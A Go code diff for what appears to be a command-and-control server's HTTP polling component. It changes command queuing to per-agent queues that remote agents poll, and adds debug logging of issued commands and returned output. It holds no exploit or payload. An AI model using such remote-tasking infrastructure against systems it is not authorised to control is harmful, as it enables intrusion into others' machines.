@@ -19,7 +19,7 @@ type HTTPPollingProtocol struct {
 	mux      *http.ServeMux
 	commands struct {
 		sync.Mutex
-		queue []string
+		queue map[string][]string // agentID -> []command
 	}
 	results struct {
 		sync.Mutex
@@ -65,7 +65,7 @@ func NewHTTPPollingProtocol(config BaseProtocolConfig) *HTTPPollingProtocol {
 			list map[string]*Listener
 		}{list: make(map[string]*Listener)},
 	}
-
+	p.commands.queue = make(map[string][]string)
 	p.registerRoutes()
 	return p
 }
@@ -206,6 +206,8 @@ func (p *HTTPPollingProtocol) handleAgentResults(w http.ResponseWriter, r *http.
 		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
 	}
 
+	log.Printf("[DEBUG] handleAgentResults: agentID=%s, command=%s, output=%s", agentID, result.Command, result.Output)
+
 	p.results.Lock()
 	p.results.queue = append(p.results.queue, result)
 	p.results.Unlock()
@@ -228,13 +230,6 @@ func (p *HTTPPollingProtocol) Stop() error {
 
 func (p *HTTPPollingProtocol) Initialize() error {
 	return os.MkdirAll(p.config.UploadDir, 0755)
-}
-
-func (p *HTTPPollingProtocol) HandleCommand(cmd string) error {
-	p.commands.Lock()
-	p.commands.queue = append(p.commands.queue, cmd)
-	p.commands.Unlock()
-	return nil
 }
 
 func (p *HTTPPollingProtocol) HandleFileUpload(filename string, fileData io.Reader) error {
@@ -292,31 +287,46 @@ func enableCors(w *http.ResponseWriter) {
 }
 
 // HTTP Handlers
+// Dummy HandleCommand to satisfy Protocol interface
+func (p *HTTPPollingProtocol) HandleCommand(cmd string) error {
+	log.Printf("[WARN] HandleCommand called without agent context; use QueueCommand(agentID, cmd) instead.")
+	return nil
+}
+
+// Update handleQueueCommand to do nothing or return an error (since it's not used for agent commands)
 func (p *HTTPPollingProtocol) handleQueueCommand(w http.ResponseWriter, r *http.Request) {
 	enableCors(&w)
 	if r.Method != http.MethodPost {
 		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
-
-	cmd := make([]byte, r.ContentLength)
-	r.Body.Read(cmd)
-	p.HandleCommand(string(cmd))
-	fmt.Fprintf(w, "Command queued")
+	// This endpoint is deprecated; use the API server to queue commands per agent.
+	http.Error(w, "Use /api/agents/{agentId}/command via API server", http.StatusNotImplemented)
 }
 
 func (p *HTTPPollingProtocol) handleGetCommand(w http.ResponseWriter, r *http.Request) {
 	enableCors(&w)
+	// Extract agentID from URL: /api/agent/{agentId}/command
+	parts := strings.Split(r.URL.Path, "/")
+	if len(parts) < 5 {
+		http.Error(w, "Invalid request path", http.StatusBadRequest)
+		return
+	}
+	agentID := parts[3]
+
 	p.commands.Lock()
 	defer p.commands.Unlock()
-
-	if len(p.commands.queue) == 0 {
+	queue := p.commands.queue[agentID]
+	log.Printf("[DEBUG] handleGetCommand: agentID=%s, queueLen=%d", agentID, len(queue))
+	if len(queue) == 0 {
 		w.WriteHeader(http.StatusNoContent)
 		return
 	}
-
-	cmd := p.commands.queue[0]
-	p.commands.queue = p.commands.queue[1:]
+	cmd := queue[0]
+	p.commands.queue[agentID] = queue[1:]
+	if len(queue) > 0 {
+		log.Printf("[DEBUG] handleGetCommand: returning command to agent %s: %s", agentID, cmd)
+	}
 	w.Write([]byte(cmd))
 }
 
@@ -474,4 +484,12 @@ func (p *HTTPPollingProtocol) GetAllAgents() map[string]interface{} {
 		result[id] = agent
 	}
 	return result
+}
+
+// QueueCommand queues a command for a specific agent
+func (p *HTTPPollingProtocol) QueueCommand(agentID, cmd string) {
+	p.commands.Lock()
+	p.commands.queue[agentID] = append(p.commands.queue[agentID], cmd)
+	p.commands.Unlock()
+	log.Printf("[DEBUG] QueueCommand: agentID=%s, cmd=%s, queueLen=%d", agentID, cmd, len(p.commands.queue[agentID]))
 }
